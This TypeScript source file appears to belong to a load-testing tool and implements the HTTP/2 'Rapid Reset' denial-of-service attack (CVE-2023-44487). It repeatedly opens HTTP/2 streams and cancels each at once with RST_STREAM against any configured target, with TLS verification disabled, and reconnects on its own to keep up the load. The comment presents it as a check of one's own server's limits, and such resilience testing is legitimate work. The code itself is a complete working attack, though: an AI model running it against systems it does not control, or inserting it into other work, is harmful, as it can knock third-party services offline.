import http2 from 'http2';
import { URL } from 'url';
import { workerData, parentPort } from 'worker_threads';
import Metrics from '../core/metrics';
import { Http2WorkerData, ReportMessage, WorkerMessage } from '../types';

/**
 * HTTP/2 "Rapid Reset" scenario (CVE-2023-44487).
 *
 * Opens HTTP/2 sessions and, on each, repeatedly creates a stream and
 * immediately cancels it with RST_STREAM. Use this to verify your own
 * server/proxy enforces a cap on concurrent + reset streams.
 *
 * Reported "requests" = streams opened-then-reset.
 */
if (!parentPort) throw new Error('http2-rapid-reset-worker must run as a worker thread');
const messagePort = parentPort;

const data = workerData as Http2WorkerData;
const { target, concurrency, path: reqPath } = data;

const url = new URL(target);
const authority = `${url.protocol}//${url.host}`;
const streamPath = reqPath || url.pathname || '/';

const metrics = new Metrics();
const sessions = new Set<http2.ClientHttp2Session>();
let running = true;
let reported = false;

function report(): void {
  if (reported) return;
  reported = true;
  const msg: ReportMessage = { type: 'report', snapshot: metrics.toSnapshot() };
  messagePort.postMessage(msg);
}

function openSession(): void {
  if (!running) return;
  let connected = false;
  let closed = false;

  const session = http2.connect(authority, { rejectUnauthorized: false });
  sessions.add(session);

  const onClose = (): void => {
    if (closed) return;
    closed = true;
    sessions.delete(session);
    // Reconnect to keep pressure while the test runs; once stopped, the last
    // session to close emits the final report.
    if (running) setTimeout(openSession, connected ? 0 : 250);
    else if (sessions.size === 0) report();
  };

  session.on('error', (err: NodeJS.ErrnoException) => metrics.recordError(err.code || err.message));
  session.on('close', onClose);

  session.on('connect', () => {
    connected = true;
    const tick = (): void => {
      if (!running || session.closed || session.destroyed) {
        if (!session.closed) session.close();
        return;
      }
      try {
        const req = session.request({ ':path': streamPath, ':method': 'GET' });
        req.on('error', () => { /* expected on cancel */ });
        metrics.recordSuccess(0, 'stream_reset');
        // Immediately cancel the stream -> RST_STREAM frame on the wire.
        req.close(http2.constants.NGHTTP2_CANCEL);
      } catch (err) {
        const e = err as NodeJS.ErrnoException;
        metrics.recordError(e.code || e.message);
      }
      setImmediate(tick);
    };
    tick();
  });
}

messagePort.on('message', (msg: WorkerMessage) => {
  if (msg && msg.type === 'stop') {
    running = false;
    if (sessions.size === 0) {
      report();
    } else {
      sessions.forEach((s) => { if (!s.destroyed) s.destroy(); });
      // Fallback: force the report even if a session never emits 'close'.
      setTimeout(report, 1000);
    }
  }
});

for (let i = 0; i < concurrency; i += 1) {
  openSession();
}
